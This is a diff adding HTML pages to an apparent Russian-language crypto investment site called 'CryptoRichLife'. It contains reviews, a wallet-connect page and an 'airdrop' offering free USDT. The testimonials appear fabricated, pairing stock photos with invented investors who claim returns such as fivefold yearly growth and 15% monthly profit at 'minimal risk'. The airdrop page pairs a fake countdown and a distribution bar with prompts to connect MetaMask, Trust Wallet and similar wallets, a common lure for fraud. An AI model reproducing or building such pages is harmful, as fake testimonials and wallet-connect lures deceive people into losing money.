+                            <img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxzZWFyY2h8M3x8cGVydXZpYW4lMjBtYW58ZW58MHx8MHx8fDA%3D&auto=format&fit=crop&w=500&q=60" alt="Carlos" class="review-avatar" onerror="this.src='data:image/svg+xml;charset=UTF-8,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' width=\'500\' height=\'500\' viewBox=\'0 0 500 500\'%3E%3Crect fill=\'%2300f0ff\' width=\'500\' height=\'500\'/%3E%3Ctext fill=\'%23ffffff\' font-family=\'Arial\' font-size=\'30\' x=\'50%25\' y=\'50%25\' text-anchor=\'middle\'%3ECarlos%3C/text%3E%3C/svg%3E'">
+                            <div class="review-info">
+                                <h3>Карлос, 32 года</h3>
+                                <div class="review-country">
+                                    <i class="fas fa-map-marker-alt"></i> Лима, Перу
+                                </div>
+                            </div>
+                        </div>
+                        <div class="review-content">
+                            <p>"Всего за 8 месяцев мой портфель вырос с 3000 USDT до 15000 USDT благодаря стейкингу и арбитражной торговле. Теперь я могу обеспечивать свою семью и инвестировать в недвижимость в Лиме."</p>
+                        </div>
+                        <div class="review-rating">
+                            <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i>
+                        </div>
+                    </div>
+                    
+                    <div class="review-card">
+                        <div class="review-header">
+                            <img src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxzZWFyY2h8MTh8fGV1cm9wZWFuJTIwd29tYW58ZW58MHx8MHx8fDA%3D&auto=format&fit=crop&w=500&q=60" alt="Sophie" class="review-avatar" onerror="this.src='data:image/svg+xml;charset=UTF-8,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' width=\'500\' height=\'500\' viewBox=\'0 0 500 500\'%3E%3Crect fill=\'%235773ff\' width=\'500\' height=\'500\'/%3E%3Ctext fill=\'%23ffffff\' font-family=\'Arial\' font-size=\'30\' x=\'50%25\' y=\'50%25\' text-anchor=\'middle\'%3ESophie%3C/text%3E%3C/svg%3E'">
+                            <div class="review-info">
+                                <h3>Софи, 29 лет</h3>
+                                <div class="review-country">
+                                    <i class="fas fa-map-marker-alt"></i> Париш, Франция
+                                </div>
+                            </div>
+                        </div>
+                        <div class="review-content">
+                            <p>"Начала с майнинга с суммой 800 USDT. Через год мой ежемесячный пассивный доход составляет 2000 USDT. Благодаря CryptoRichLife я смогла открыть свой бизнес в Париже!"</p>
+                        </div>
+                        <div class="review-rating">
+                            <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star-half-alt"></i>
+                        </div>
+                    </div>
+                    
+                    <div class="review-card">
+                        <div class="review-header">
+                            <img src="https://images.unsplash.com/photo-1500648767791-00dcc994a43e?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxzZWFyY2h8MjB8fGV1cm9pYW4lMjBtYW58ZW58MHx8MHx8fHww&auto=format&fit=crop&w=500&q=60" alt="Markus" class="review-avatar" onerror="this.src='data:image/svg+xml;charset=UTF-8,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' width=\'500\' height=\'500\' viewBox=\'0 0 500 500\'%3E%3Crect fill=\'%23ff00c8\' width=\'500\' height=\'500\'/%3E%3Ctext fill=\'%23ffffff\' font-family=\'Arial\' font-size=\'30\' x=\'50%25\' y=\'50%25\' text-anchor=\'middle\'%3EMarkus%3C/text%3E%3C/svg%3E'">
+                            <div class="review-info">
+                                <h3>Маркус, 41 год</h3>
+                                <div class="review-country">
+                                    <i class="fas fa-map-marker-alt"></i> Берлин, Германия
+                                </div>
+                            </div>
+                        </div>
+                        <div class="review-content">
+                            <p>"Благодаря арбитражной торговле смог выйти на пассивный доход 3500 USDT в месяц. Инвестировал 5000 USDT два года назад. Теперь могу позволить себе путешествовать по миру 6 месяцев в году."</p>
+                        </div>
+                        <div class="review-rating">
+                            <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i>
+                        </div>
+                    </div>
+                    
+                    <div class="review-card">
+                        <div class="review-header">
+                            <img src="https://images.unsplash.com/photo-1488426862026-3ee34a7d66df?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxzZWFyY2h8MjJ8fHBlcnV2aWFuJTIwd29tYW58ZW58MHx8MHx8fDA%3D&auto=format&fit=crop&w=500&q=60" alt="Elena" class="review-avatar" onerror="this.src='data:image/svg+xml;charset=UTF-8,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' width=\'500\' height=\'500\' viewBox=\'0 0 500 500\'%3E%3Crect fill=\'%2300f0ff\' width=\'500\' height=\'500\'/%3E%3Ctext fill=\'%23ffffff\' font-family=\'Arial\' font-size=\'30\' x=\'50%25\' y=\'50%25\' text-anchor=\'middle\'%3EElena%3C/text%3E%3C/svg%3E'">
+                            <div class="review-info">
+                                <h3>Елена, 36 лет</h3>
+                                <div class="review-country">
+                                    <i class="fas fa-map-marker-alt"></i> Куско, Перу
+                                </div>
+                            </div>
+                        </div>
+                        <div class="review-content">
+                            <p>"За 10 месяцев увеличила депозит с 1500 USDT до 10000 USDT благодаря стейкингу и трейдингу. Теперь могу позволить себе роскошную жизнь и помогать своей семье в Перу."</p>
+                        </div>
+                        <div class="review-rating">
+                            <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i>
+                        </div>
+                    </div>
+                    
+                    <div class="review-card">
+                        <div class="review-header">
+                            <img src="https://images.unsplash.com/photo-1552058544-f2b08422138a?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxzZWFyY2h8Nnx8cGVyc29ufGVufDB8fDB8fHww&auto=format&fit=crop&w=500&q=60" alt="Alessandro" class="review-avatar" onerror="this.src='data:image/svg+xml;charset=UTF-8,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' width=\'500\' height=\'500\' viewBox=\'0 0 500 500\'%3E%3Crect fill=\'%235773ff\' width=\'500\' height=\'500\'/%3E%3Ctext fill=\'%23ffffff\' font-family=\'Arial\' font-size=\'30\' x=\'50%25\' y=\'50%25\' text-anchor=\'middle\'%3EAlessandro%3C/text%3E%3C/svg%3E'">
+                            <div class="review-info">
+                                <h3>Алессандро, 45 лет</h3>
+                                <div class="review-country">
+                                    <i class="fas fa-map-marker-alt"></i> Милан, Италия
+                                </div>
+                            </div>
+                        </div>
+                        <div class="review-content">
+                            <p>"Благодаря NFT инвестициям смог увеличить свой капитал в 5 раз за год. Начал с 2000 USDT, сейчас мой портфель оценивается в 10000 USDT. Отличная платформа для начинающих и опытных инвесторов!"</p>
+                        </div>
+                        <div class="review-rating">
+                            <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star-half-alt"></i>
+                        </div>
+                    </div>
+                    
+                    <div class="review-card">
+                        <div class="review-header">
+                            <img src="https://images.unsplash.com/photo-1590086782792-42dd2350140d?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxzZWFyY2h8MTd8fHBlcnNvbnxlbnwwfHwwfHx8MA%3D%3D&auto=format&fit=crop&w=500&q=60" alt="Maria" class="review-avatar" onerror="this.src='data:image/svg+xml;charset=UTF-8,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' width=\'500\' height=\'500\' viewBox=\'0 0 500 500\'%3E%3Crect fill=\'%23ff00c8\' width=\'500\' height=\'500\'/%3E%3Ctext fill=\'%23ffffff\' font-family=\'Arial\' font-size=\'30\' x=\'50%25\' y=\'50%25\' text-anchor=\'middle\'%3EMaria%3C/text%3E%3C/svg%3E'">
+                            <div class="review-info">
+                                <h3>Мария, 31 год</h3>
+                                <div class="review-country">
+                                    <i class="fas fa-map-marker-alt"></i> Мадрид, Испания
+                                </div>
+                            </div>
+                        </div>
+                        <div class="review-content">
+                            <p>"Yield Farming принес мне 80% прибыли за год. Инвестировала 2500 USDT, сейчас мой депозит составляет 4500 USDT. Очень довольна сервисом и поддержкой, которая всегда на связи."</p>
+                        </div>
+                        <div class="review-rating">
+                            <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i>
+                        </div>
+                    </div>
+
+                    <div class="review-card">
+                        <div class="review-header">
+                            <img src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxzZWFyY2h8OXx8cGVydXZpYW4lMjB3b21hbnxlbnwwfHwwfHx8MA%3D%3D&auto=format&fit=crop&w=500&q=60" alt="Isabella" class="review-avatar" onerror="this.src='data:image/svg+xml;charset=UTF-8,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' width=\'500\' height=\'500\' viewBox=\'0 0 500 500\'%3E%3Crect fill=\'%2300f0ff\' width=\'500\' height=\'500\'/%3E%3Ctext fill=\'%23ffffff\' font-family=\'Arial\' font-size=\'30\' x=\'50%25\' y=\'50%25\' text-anchor=\'middle\'%3EIsabella%3C/text%3E%3C/svg%3E'">
+                            <div class="review-info">
+                                <h3>Изабелла, 38 лет</h3>
+                                <div class="review-country">
+                                    <i class="fas fa-map-marker-alt"></i> Арекипа, Перу
+                                </div>
+                            </div>
+                        </div>
+                        <div class="review-content">
+                            <p>"Стейкинг криптовалюты полностью изменил мою жизнь. С инвестицией в 5000 USDT я получаю пассивный доход 180 USDT ежемесячно. Это позволило мне бросить работу и заняться благотворительностью."</p>
+                        </div>
+                        <div class="review-rating">
+                            <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i>
+                        </div>
+                    </div>
+
+                    <div class="review-card">
+                        <div class="review-header">
+                            <img src="https://images.unsplash.com/photo-1560250097-0b93528c311a?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxzZWFyY2h8MTF8fGV1cm9wZWFuJTIwbWFufGVufDB8fDB8fHww&auto=format&fit=crop&w=500&q=60" alt="Thomas" class="review-avatar" onerror="this.src='data:image/svg+xml;charset=UTF-8,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' width=\'500\' height=\'500\' viewBox=\'0 0 500 500\'%3E%3Crect fill=\'%235773ff\' width=\'500\' height=\'500\'/%3E%3Ctext fill=\'%23ffffff\' font-family=\'Arial\' font-size=\'30\' x=\'50%25\' y=\'50%25\' text-anchor=\'middle\'%3EThomas%3C/text%3E%3C/svg%3E'">
+                            <div class="review-info">
+                                <h3>Томас, 52 года</h3>
+                                <div class="review-country">
+                                    <i class="fas fa-map-marker-alt"></i> Амстердам, Нидерланды
+                                </div>
+                            </div>
+                        </div>
+                        <div class="review-content">
+                            <p>"За 2 года мой портфель вырос с 10000 USDT до 65000 USDT. Сочетание майнинга и стейкинга дало потрясающие результаты. Теперь я финансово свободен и могу посвятить время семье и путешествиям."</p>
+                        </div>
+                        <div class="review-rating">
+                            <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star-half-alt"></i>
+                        </div>
+                    </div>
+
+                    <div class="review-card">
+                        <div class="review-header">
+                            <img src="https://images.unsplash.com/photo-1573497019940-1c28c88b4f3e?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxzZWFyY2h8MTJ8fHBlcnV2aWFuJ20wd29tYW58ZW58MHx8MHx8fDA%3D&auto=format&fit=crop&w=500&q=60" alt="Camila" class="review-avatar" onerror="this.src='data:image/svg+xml;charset=UTF-8,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' width=\'500\' height=\'500\' viewBox=\'0 0 500 500\'%3E%3Crect fill=\'%23ff00c8\' width=\'500\' height=\'500\'/%3E%3Ctext fill=\'%23ffffff\' font-family=\'Arial\' font-size=\'30\' x=\'50%25\' y=\'50%25\' text-anchor=\'middle\'%3ECamila%3C/text%3E%3C/svg%3E'">
+                            <div class="review-info">
+                                <h3>Камила, 27 лет</h3>
+                                <div class="review-country">
+                                    <i class="fas fa-map-marker-alt"></i> Трухильо, Перу
+                                </div>
+                            </div>
+                        </div>
+                        <div class="review-content">
+                            <p>"NFT инвестиции принесли мне 300% прибыли за 9 месяцев. Я купила несколько цифровых произведений искусства по совету консультантов платформы, и их стоимость взлетела. Невероятно!"</p>
+                        </div>
+                        <div class="review-rating">
+                            <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i>
+                        </div>
+                    </div>
+
+                    <div class="review-card">
+                        <div class="review-header">
+                            <img src="https://images.unsplash.com/photo-1508341591423-4347099e1f19?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxzZWFyY2h8MTd8fGV1cm9wZWFuJTIwbWFufGVufDB8fDB8fHww&auto=format&fit=crop&w=500&q=60" alt="Lukas" class="review-avatar" onerror="this.src='data:image/svg+xml;charset=UTF-8,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' width=\'500\' height=\'500\' viewBox=\'0 0 500 500\'%3E%3Crect fill=\'%2300f0ff\' width=\'500\' height=\'500\'/%3E%3Ctext fill=\'%23ffffff\' font-family=\'Arial\' font-size=\'30\' x=\'50%25\' y=\'50%25\' text-anchor=\'middle\'%3ELukas%3C/text%3E%3C/svg%3E'">
+                            <div class="review-info">
+                                <h3>Лукас, 34 года</h3>
+                                <div class="review-country">
+                                    <i class="fas fa-map-marker-alt"></i> Прага, Чехия
+                                </div>
+                            </div>
+                        </div>
+                        <div class="review-content">
+                            <p>"Арбитражная торговля стала для меня основным источником дохода. При вложении 8000 USDT я получаю около 400 USDT чистой прибыли еженедельно. Риски минимальны, доходность стабильна."</p>
+                        </div>
+                        <div class="review-rating">
+                            <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i>
+                        </div>
+                    </div>
+
+                    <!-- Новые отзывы -->
+                    <div class="review-card">
+                        <div class="review-header">
+                            <div class="review-avatar" style="background: linear-gradient(135deg, #00f0ff 0%, #5773ff 46%, #ff00c8 100%); display: flex; align-items: center; justify-content: center; color: white; font-weight: bold;">JR</div>
+                            <div class="review-info">
+                                <h3>Джон, 40 лет</h3>
+                                <div class="review-country">
+                                    <i class="fas fa-map-marker-alt"></i> Нью-Йорк, США
+                                </div>
+                            </div>
+                        </div>
+                        <div class="review-content">
+                            <p>"С помощью стейкинга и арбитражной торговли я смог увеличить свои инвестиции на 200% за 6 месяцев. Теперь я могу позволить себе жить в любом месте мира и работать удаленно."</p>
+                        </div>
+                        <div class="review-rating">
+                            <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i>
+                        </div>
+                    </div>
+
+                    <div class="review-card">
+                        <div class="review-header">
+                            <div class="review-avatar" style="background: linear-gradient(135deg, #00f0ff 0%, #5773ff 46%, #ff00c8 100%); display: flex; align-items: center; justify-content: center; color: white; font-weight: bold;">AR</div>
+                            <div class="review-info">
+                                <h3>Анна, 29 лет</h3>
+                                <div class="review-country">
+                                    <i class="fas fa-map-marker-alt"></i> Варшава, Польша
+                                </div>
+                            </div>
+                        </div>
+                        <div class="review-content">
+                            <p>"Благодаря майнингу и стейкингу я смогла накопить на первоначальный взнос за дом. Всего за год мой портфель вырос с 2000 USDT до 12000 USDT. Это лучше, чем любой банковский депозит!"</p>
+                        </div>
+                        <div class="review-rating">
+                            <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star-half-alt"></i>
+                        </div>
+                    </div>
+
+                    <div class="review-card">
+                        <div class="review-header">
+                            <div class="review-avatar" style="background: linear-gradient(135deg, #00f0ff 0%, #5773ff 46%, #ff00c8 100%); display: flex; align-items: center; justify-content: center; color: white; font-weight: bold;">DR</div>
+                            <div class="review-info">
+                                <h3>Давид, 35 лет</h3>
+                                <div class="review-country">
+                                    <i class="fas fa-map-marker-alt"></i> Тель-Авив, Израиль
+                                </div>
+                            </div>
+                        </div>
+                        <div class="review-content">
+                            <p>"Трейдинг с помощью ваших роботов принес мне 15% прибыли в месяц. Я пробовал разные стратегии, но эта оказалась самой стабильной и надежной. Спасибо за качественный сервис!"</p>
+                        </div>
+                        <div class="review-rating">
+                            <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i>
+                        </div>
+                    </div>
+
+                    <div class="review-card">
+                        <div class="review-header">
+                            <div class="review-avatar" style="background: linear-gradient(135deg, #00f0ff 0%, #5773ff 46%, #ff00c8 100%); display: flex; align-items: center; justify-content: center; color: white; font-weight: bold;">SR</div>
+                            <div class="review-info">
+                                <h3>Сара, 33 года</h3>
+                                <div class="review-country">
+                                    <i class="fas fa-map-marker-alt"></i> Лондон, Великобритания
+                                </div>
+                            </div>
+                        </div>
+                        <div class="review-content">
+                            <p>"Благодаря Yield Farming я получаю пассивный доход 1200 USDT в месяц. Инвестировала 10000 USDT и уже окупила вложения. Теперь могу сосредоточиться на своем хобби - путешествиях."</p>
+                        </div>
+                        <div class="review-rating">
+                            <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i>
+                        </div>
+                    </div>
+
+                    <div class="review-card">
+                        <div class="review-header">
+                            <div class="review-avatar" style="background: linear-gradient(135deg, #00f0ff 0%, #5773ff 46%, #ff00c8 100%); display: flex; align-items: center; justify-content: center; color: white; font-weight: bold;">MR</div>
+                            <div class="review-info">
+                                <h3>Михаил, 43 года</h3>
+                                <div class="review-country">
+                                    <i class="fas fa-map-marker-alt"></i> Москва, Россия
+                                </div>
+                            </div>
+                        </div>
+                        <div class="review-content">
+                            <p>"За 18 месяцев мой портфель вырос с 5000 USDT до 35000 USDT. Сочетание стейкинга, майнинга и арбитражной торговли дало потрясающие результаты. Рекомендую эту платформу всем!"</p>
+                        </div>
+                        <div class="review-rating">
+                            <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star-half-alt"></i>
+                        </div>
+                    </div>
+
+                    <div class="review-card">
+                        <div class="review-header">
+                            <div class="review-avatar" style="background: linear-gradient(135deg, #00f0ff 0%, #5773ff 46%, #ff00c8 100%); display: flex; align-items: center; justify-content: center; color: white; font-weight: bold;">JR</div>
+                            <div class="review-info">
+                                <h3>Джулия, 31 год</h3>
+                                <div class="review-country">
+                                    <i class="fas fa-map-marker-alt"></i> Сидней, Австралия
+                                </div>
+                            </div>
+                        </div>
+                        <div class="review-content">
+                            <p>"NFT инвестиции принесли мне невероятную прибыль. Купила несколько редких NFT за 2000 USDT, а через 8 месяцев продала их за 15000 USDT. Это лучшая инвестиция в моей жизни!"</p>
+                        </div>
+                        <div class="review-rating">
+                            <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i>
+                        </div>
+                    </div>
+
+                    <div class="review-card">
+                        <div class="review-header">
+                            <div class="review-avatar" style="background: linear-gradient(135deg, #00f0ff 0%, #5773ff 46%, #ff00c8 100%); display: flex; align-items: center; justify-content: center; color: white; font-weight: bold;">KR</div>
+                            <div class="review-info">
+                                <h3>Кевин, 38 лет</h3>
+                                <div class="review-country">
+                                    <i class="fas fa-map-marker-alt"></i> Торонто, Канада
+                                </div>
+                            </div>
+                        </div>
+                        <div class="review-content">
+                            <p>"Благодаря арбитражной торговле я получаю стабильный доход 800 USDT в неделю. Начал с 3000 USDT, и за год мой портфель вырос до 25000 USDT. Очень доволен результатами!"</p>
+                        </div>
+                        <div class="review-rating">
+                            <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i>
+                        </div>
+                    </div>
+
+                    <div class="review-card">
+                        <div class="review-header">
+                            <div class="review-avatar" style="background: linear-gradient(135deg, #00f0ff 0%, #5773ff 46%, #ff00c8 100%); display: flex; align-items: center; justify-content: center; color: white; font-weight: bold;">NR</div>
+                            <div class="review-info">
+                                <h3>Наталья, 36 лет</h3>
+                                <div class="review-country">
+                                    <i class="fas fa-map-marker-alt"></i> Киев, Украина
+                                </div>
+                            </div>
+                        </div>
+                        <div class="review-content">
+                            <p>"Стейкинг приносит мне пассивный доход 450 USDT в месяц. Инвестировала 8000 USDT и уже через полгода получаю стабильную прибыль. Это лучше, чем любые банковские вклады!"</p>
+                        </div>
+                        <div class="review-rating">
+                            <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star-half-alt"></i>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <section class="form-container">
+                <h2 class="section-title">Оставьте свой отзыв</h2>
+                <form id="reviewForm">
+                    <div class="form-group">
+                        <label for="userName">Ваше имя:</label>
+                        <input type="text" id="userName" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="userAge">Ваш возраст:</label>
+                        <input type="number" id="userAge" min="18" max="100" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="userCountry">Ваша страна:</label>
+                        <input type="text" id="userCountry" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="userExperience">Ваш опыт заработка:</label>
+                        <textarea id="userExperience" rows="5" required></textarea>
+                    </div>
+                    <div class="form-group">
+                        <label for="userRating">Оценка:</label>
+                        <select id="userRating" required>
+                            <option value="">-- Выберите оценку --</option>
+                            <option value="5">5 звезд</option>
+                            <option value="4">4 звезды</option>
+                            <option value="3">3 звезды</option>
+                            <option value="2">2 звезды</option>
+                            <option value="1">1 звезда</option>
+                        </select>
+                    </div>
+                    <button type="submit" class="btn">Отправить отзыв</button>
+                </form>
+            </section>
+        </section>
+
+        <!-- Страница кошелька -->
+        <section id="wallet" class="page">
+            <div class="hero">
+                <div class="hero-content">
+                    <h1>Подключение кошелька</h1>
+                    <p>Подключите ваш криптокошелек для начала работы с нашей платформой.</p>
+                </div>
+            </div>
+
+            <section class="features">
+                <h2 class="section-title">Поддерживаемые кошельки</h2>
+                <div class="wallets-grid">
+                    <div class="wallet-card" data-wallet="metamask">
+                        <div class="wallet-icon">
+                            <i class="fab fa-ethereum"></i>
+                        </div>
+                        <h3>MetaMask</h3>
+                    </div>
+                    <div class="wallet-card" data-wallet="trust">
+                        <div class="wallet-icon">
+                            <i class="fas fa-wallet"></i>
+                        </div>
+                        <h3>Trust Wallet</h3>
+                    </div>
+                    <div class="wallet-card" data-wallet="binance">
+                        <div class="wallet-icon">
+                            <i class="fab fa-bitcoin"></i>
+                        </div>
+                        <h3>Binance Chain</h3>
+                    </div>
+                    <div class="wallet-card" data-wallet="coinbase">
+                        <div class="wallet-icon">
+                            <i class="fab fa-bitcoin"></i>
+                        </div>
+                        <h3>Coinbase Wallet</h3>
+                    </div>
+                    <div class="wallet-card" data-wallet="exodus">
+                        <div class="wallet-icon">
+                            <i class="fas fa-wallet"></i>
+                        </div>
+                        <h3>Exodus</h3>
+                    </div>
+                    <div class="wallet-card" data-wallet="ledger">
+                        <div class="wallet-icon">
+                            <i class="fas fa-shield-alt"></i>
+                        </div>
+                        <h3>Ledger Live</h3>
+                    </div>
+                    <div class="wallet-card" data-wallet="trezor">
+                        <div class="wallet-icon">
+                            <i class="fas fa-shield-alt"></i>
+                        </div>
+                        <h3>Trezor Suite</h3>
+                    </div>
+                    <div class="wallet-card" data-wallet="phantom">
+                        <div class="wallet-icon">
+                            <i class="fas fa-ghost"></i>
+                        </div>
+                        <h3>Phantom</h3>
+                    </div>
+                </div>
+            </section>
+
+            <section class="form-container">
+                <h2 class="section-title">Подключение кошелька</h2>
+                <div class="form-group">
+                    <label>Выберите способ подключения:</label>
+                    <div style="display: flex; gap: 15px; margin-top: 15px; flex-wrap: wrap;">
+                        <button class="btn wallet-connect-btn" data-wallet="metamask" style="flex: 1; min-width: 120px;">MetaMask</button>
+                        <button class="btn wallet-connect-btn" data-wallet="walletconnect" style="flex: 1; min-width: 120px;">WalletConnect</button>
+                    </div>
+                </div>
+                
+                <div id="walletInfo" style="display: none; margin-top: 30px; padding: 20px; background: rgba(0,0,0,0.2); border-radius: 15px;">
+                    <h3>Информация о кошельке</h3>
+                    <p>Адрес: <span id="walletPageAddress"></span></p>
+                    <p>Баланс: <span id="walletPageBalance"></span></p>
+                    <p>Сеть: <span id="walletPageNetwork"></span></p>
+                    <button class="btn" style="margin-top: 15px;" id="disconnectWallet">Отключить кошелек</button>
+                </div>
+            </section>
+        </section>
+
+        <!-- Страница аирдропа -->
+        <section id="airdrop" class="page">
+            <div class="hero">
+                <div class="hero-content">
+                    <h1>Аирдроп программа</h1>
+                    <p>Получите бесплатные USDT за регистрацию и выполнение простых заданий!</p>
+                </div>
+            </div>
+
+            <section class="airdrop-section">
+                <h2 class="section-title">Получите 50 USDT за регистрацию</h2>
+                
+                <div class="airdrop-timer">
+                    До конца акции: <span id="countdown">23:59:59</span>
+                </div>
+                
+                <div class="airdrop-progress">
+                    <div class="airdrop-progress-bar"></div>
+                </div>
+                <p>65% токенов уже распределено</p>
+                
+                <div class="form-container">
+                    <h3>Участвуйте в аирдропе</h3>
+                    
+                    <div id="connectWalletAirdrop">
+                        <p>Для участия в аирдропе подключите ваш кошелек</p>
+                        <div style="display: flex; gap: 15px; margin-top: 20px; flex-wrap: wrap; justify-content: center;">
+                            <button class="btn wallet-connect-btn" data-wallet="metamask" style="flex: 1; min-width: 120px;">MetaMask</button>
+                            <button class="btn wallet-connect-btn" data-wallet="trust" style="flex: 1; min-width: 120px;">Trust Wallet</button>
+                            <button class="btn wallet-connect-btn" data-wallet="walletconnect" style="flex: 1; min-width: 120px;">WalletConnect</button>
+                        </div>
+                    </div>
+                    
+                    <div id="walletConnectedAirdrop" style="display: none;">
+                        <div style="text-align: center; padding: 20px; background: rgba(0,240,255,0.1); border-radius: 15px; margin: 20px 0;">
+                            <i class="fas fa-check-circle" style="color: var(--accent); font-size: 3em; margin-bottom: 15px;"></i>
+                            <h3>Кошелек подключен!</h3>
+                            <p>Адрес: <span id="airdropWalletAddress"></span></p>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="airdropEmail">Ваш Email:</label>
+                            <input type="email" id="airdropEmail" required>
+                        </div>
+                        <div class="form-group">
+                            <label>
+                                <input type="checkbox" required> Я согласен с условиями программы
+                            </label>
+                        </div>
+                        <button type="button" class="btn" id="claimAirdrop">Получить 50 USDT</button>
+                    </div>
+                </div>
+                
+                <div class="features" style="padding-top: 50px;">
+                    <h2 class="section-title">Как увеличить награду?</h2>
+                    <div class="features-grid">
+                        <div class="feature-card">
+                            <div class="feature-icon">
+                                <i class="fab fa-telegram"></i>
+                            </div>
+                            <h3>Подписка на Telegram</h3>
+                            <p>Подпишитесь на наш Telegram-канал и получите дополнительно 10 USDT</p>
+                            <button class="btn" style="margin-top: 15px;">Подписаться</button>
+                        </div>
+                        <div class="feature-card">
+                            <div class="feature-icon">
+                                <i class="fab fa-twitter"></i>
+                            </div>
+                            <h3>Ретвит в Twitter</h3>
+                            <p>Сделайте ретвит нашего сообщения и получите дополнительно 15 USDT</p>
+                            <button class="btn" style="margin-top: 15px;">Ретвитнуть</button>
+                        </div>
+                        <div class="feature-card">
+                            <div class="feature-icon">
+                                <i class="fas fa-user-friends"></i>
+                            </div>
+                            <h3>Пригласите друзей</h3>
+                            <p>Пригласите друзей и получите 5 USDT за каждого приглашенного</p>
+                            <button class="btn" style="margin-top: 15px;">Скопировать ссылку</button>
+                        </div>
+                    </div>
+                </div>
+            </section>
+        </section>
+
+        <!-- Страница контактов -->
+        <section id="contact" class="page">
+            <div class="hero">
+                <div class="hero-content">
+                    <h1>Контакты</h3>
+                    <p>Свяжитесь с нашей поддержкой для получения дополнительной информации.</p>
+                </div>
+            </div>
+            
+            <section class="form-container">
+                <h2 class="section-title">Форма обратной связи</h2>
+                <form id="contactForm">
+                    <div class="form-group">
+                        <label for="contactName">Ваше имя:</label>
+                        <input type="text" id="contactName" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="contactEmail">Ваш Email:</label>
+                        <input type="email" id="contactEmail" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="contactSubject">Тема:</label>
+                        <input type="text" id="contactSubject" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="contactMessage">Сообщение:</label>
+                        <textarea id="contactMessage" rows="5" required></textarea>
+                    </div>
+                    <button type="submit" class="btn">Отправить сообщение</button>
+                </form>
+            </section>
+            
+            <section class="features" style="padding-top: 50px;">
+                <h2 class="section-title">Наши контакты</h2>
+                <div class="features-grid">
+                    <div class="feature-card">
+                        <div class="feature-icon">
+                            <i class="fas fa-envelope"></i>
+                        </div>
+                        <h3>Email</h3>
+                        <p>support@cryptorichlife.com</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">
+                            <i class="fab fa-telegram"></i>
+                        </div>
+                        <h3>Telegram</h3>
+                        <p>@CryptoRichLife_Support</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">
+                            <i class="fab fa-discord"></i>
+                        </div>
+                        <h3>Discord</h3>
+                        <p>Присоединяйтесь к нашему сообществу</p>
+                    </div>
+                </div>
+            </section>
+        </section>
+    </main>
+
+    <footer class="footer">
+        <div class="footer-content">
+            <div class="footer-column">
+                <h3>О нас</h3>
+                <ul class="footer-links">
+                    <li><a href="#">Наша история</a></li>
+                    <li><a href="#">Команда</a></li>
+                    <li><a href="#">Партнеры</a></li>
+                </ul>
+            </div>
+            <div class="footer-column">
